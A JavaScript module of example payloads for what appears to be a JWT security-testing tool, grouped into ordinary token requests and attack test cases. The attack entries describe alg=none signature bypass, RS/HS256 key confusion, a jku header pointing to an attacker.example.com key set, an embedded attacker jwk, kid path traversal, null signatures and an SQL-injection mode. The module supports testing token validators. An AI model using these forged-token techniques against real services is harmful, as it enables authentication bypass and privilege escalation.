export const tokenExamples = {
  basic: {
    group: 'Basic tokens',
    summary: 'Token request',
    value: {
      mode: 'fake',
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: 'rsa-key-1'
      },
      body: {
        sub: 'user123',
        scope: 'openid profile email',
        roles: ['admin', 'user']
      }
    }
  },
  accessToken: {
    group: 'Token response types',
    summary: 'Access token (response_type=token)',
    value: {
      response_type: 'token',
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: 'rsa-key-1'
      },
      body: {
        sub: 'user123',
        scope: 'read write',
        aud: 'https://api.example.com'
      }
    }
  },
  idToken: {
    group: 'Token response types',
    summary: 'ID token (response_type=id_token)',
    value: {
      response_type: 'id_token',
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: 'rsa-key-1'
      },
      body: {
        sub: 'user123',
        name: 'John Doe',
        email: 'john@example.com',
        email_verified: true,
        aud: 'my-client-app',
        nonce: 'random-nonce-12345'
      }
    }
  },
  both: {
    group: 'Token response types',
    summary: 'Access token and ID token',
    value: {
      response_type: 'id_token token',
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: 'rsa-key-1'
      },
      body: {
        sub: 'user123',
        name: 'John Doe',
        email: 'john@example.com',
        email_verified: true,
        scope: 'openid profile email',
        aud: 'my-client-app',
        nonce: 'random-nonce-67890'
      }
    }
  },
  ec: {
    group: 'Algorithms and keys',
    summary: 'EC (ES256) token',
    value: {
      kty: 'EC',
      header: {
        alg: 'ES256',
        typ: 'JWT',
        kid: 'ec-key-1'
      },
      body: {
        sub: 'user@example.com',
        name: 'Jane Smith'
      }
    }
  },
  custom: {
    group: 'Claims',
    summary: 'Token with custom claims',
    value: {
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: 'rsa-key-1'
      },
      body: {
        sub: 'user123',
        name: 'Admin User',
        roles: ['admin', 'user'],
        permissions: ['read', 'write', 'delete'],
        tenant_id: 'tenant-abc-123'
      }
    }
  },
  headerTypeContentType: {
    group: 'Header controls',
    summary: 'Header typ and cty override',
    value: {
      header: {
        alg: 'RS256',
        typ: 'at+jwt',
        cty: 'application/jwt',
        kid: 'rsa-key-1'
      },
      body: {
        sub: 'user123',
        scope: 'read write'
      }
    }
  },
  criticalHeaders: {
    group: 'Header controls',
    summary: 'Critical header parameters',
    value: {
      header: {
        alg: 'RS256',
        typ: 'JWT',
        crit: ['exp-ext', 'custom-policy-id'],
        'exp-ext': '2026-12-31T23:59:59Z',
        'custom-policy-id': 'policy_99ab'
      },
      body: {
        sub: 'user123',
        scope: 'openid profile'
      }
    }
  },
  oidc: {
    group: 'Claims',
    summary: 'Full OIDC profile',
    value: {
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: 'rsa-key-1'
      },
      body: {
        sub: '12345678',
        name: 'John Doe',
        given_name: 'John',
        family_name: 'Doe',
        email: 'john@example.com',
        email_verified: true,
        picture: 'https://example.com/avatar.jpg',
        locale: 'en-US'
      }
    }
  },
  fuzz: {
    group: 'Testing modes',
    summary: 'Fuzz mode',
    value: {
      mode: 'fuzz',
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: 'rsa-key-1'
      },
      body: {
        sub: 'user123',
        name: 'Test User',
        email: 'test@example.com',
        roles: ['user']
      }
    }
  },
  malicious: {
    group: 'Testing modes',
    summary: 'Malicious mode with SQL injection',
    value: {
      mode: 'malicious',
      malicious_category: 'sql_injection',
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: 'rsa-key-1'
      },
      body: {
        sub: 'user123',
        name: 'Test User',
        email: 'test@example.com'
      }
    }
  },
  grammar: {
    group: 'Testing modes',
    summary: 'Grammar mode',
    value: {
      mode: 'grammar',
      grammar_category: 'injection',
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: 'trigger',
        jku: 'trigger'
      },
      body: {
        sub: 'user123',
        email: 'test@example.com',
        scope: 'openid profile'
      }
    }
  },
  fuzzWithExclusions: {
    group: 'Testing modes',
    summary: 'Fuzz mode with exclusions',
    value: {
      mode: 'fuzz',
      exclude: ['exp', 'nbf', 'iat'],
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: 'rsa-key-1'
      },
      body: {
        sub: 'user123',
        name: 'Test User',
        email: 'test@example.com',
        roles: ['user']
      }
    }
  },
  algConfusion: {
    group: 'Algorithm attacks',
    summary: 'Algorithm confusion attack',
    value: {
      vulnerability: 'rs_hs_confusion',
      header: {
        alg: 'HS256',
        typ: 'JWT',
        kid: 'rsa-key-1'
      },
      body: {
        sub: 'user123',
        name: 'Test User'
      }
    }
  },
  cve20152951: {
    group: 'Algorithm attacks',
    summary: 'alg=none signature bypass',
    value: {
      vulnerability: 'alg_none',
      alg_none_variant: 'nOne',
      header: {
        alg: 'nOne',
        typ: 'JWT'
      },
      body: {
        sub: 'user123',
        roles: ['admin']
      },
      signature: false
    }
  },
  algNoneLiteralSignature: {
    group: 'Algorithm attacks',
    summary: 'alg=none with literal signature segment',
    value: {
      vulnerability: 'alg_none',
      header: {
        alg: 'none',
        typ: 'JWT'
      },
      body: {
        sub: 'user123',
        roles: ['admin']
      },
      signature: 'literal-signature'
    }
  },
  jkuInjection: {
    group: 'Key injection attacks',
    summary: 'Key injection: jku',
    value: {
      vulnerability: 'jku_injection',
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: 'rsa-key-1',
        jku: 'https://attacker.example.com/.well-known/jwks.json'
      },
      body: {
        sub: 'user123'
      }
    }
  },
  jwkInjection: {
    group: 'Key injection attacks',
    summary: 'Key injection: jwk',
    value: {
      vulnerability: 'embedded_jwk',
      header: {
        alg: 'RS256',
        typ: 'JWT',
        jwk: {
          kty: 'RSA',
          kid: 'attacker-key',
          use: 'sig',
          alg: 'RS256',
          n: 'attacker-modulus',
          e: 'AQAB'
        }
      },
      body: {
        sub: 'user123'
      }
    }
  },
  cve201610555: {
    group: 'Algorithm attacks',
    summary: 'RS/HS256 key confusion',
    value: {
      header: {
        alg: 'HS256',
        typ: 'JWT',
        kid: 'rsa-key-1'
      },
      body: {
        sub: 'user123',
        roles: ['admin']
      }
    }
  },
  cve20180114: {
    group: 'Key injection attacks',
    summary: 'Key injection: kid',
    value: {
      vulnerability: 'kid_traversal',
      header: {
        alg: 'RS256',
        typ: 'JWT',
        kid: '../../../../../../dev/null'
      },
      body: {
        sub: 'user123'
      }
    }
  },
  cve202028042: {
    group: 'Signature controls',
    summary: 'Null signature',
    value: {
      body: {
        sub: 'user123',
        roles: ['admin']
      },
      signature: false
    }
  }
};

export const openApiTokenExamples = Object.fromEntries(
  Object.entries(tokenExamples).map(([key, example]) => [
    key,
    {
      summary: `${example.group}: ${example.summary}`,
      value: example.value
    }
  ])
);

export const tokenExampleOptions = Object.entries(tokenExamples).map(([key, example]) => ({
  key,
  group: example.group,
  label: example.summary,
  value: example.value
}));

export const tokenExampleGroups = tokenExampleOptions.reduce((groups, example) => {
  const group = groups.find((item) => item.label === example.group);
  if (group) {
    group.options.push(example);
  } else {
    groups.push({ label: example.group, options: [example] });
  }
  return groups;
}, []);
